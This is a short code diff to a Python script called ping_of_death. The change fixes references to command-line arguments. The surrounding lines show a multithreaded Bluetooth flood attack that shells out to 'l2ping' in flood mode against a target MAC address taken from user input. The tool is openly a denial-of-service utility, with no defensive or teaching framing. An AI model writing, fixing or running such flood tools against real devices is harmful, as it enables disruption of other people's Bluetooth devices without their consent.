@@ -7,7 +7,7 @@ import threading
 class ping_of_death:
     def __init__(self):
         self.argv = sys.argv
-        self.argc = len(argv)
+        self.argc = len(self.argv)
 
     def run_attack_beacon(self):
         os.system(f"l2ping -i hci0 -s 40 -f {self.mac_addr}")
@@ -27,8 +27,8 @@ class ping_of_death:
             print("ping_of_death.py <threads> <mac_addr>")
             return
 
-        self.threads = int(argv[1])
-        self.mac_addr = argv[2]
+        self.threads = int(self.argv[1])
+        self.mac_addr = self.argv[2]
     
         self.threads_list = [None] * self.threads
       
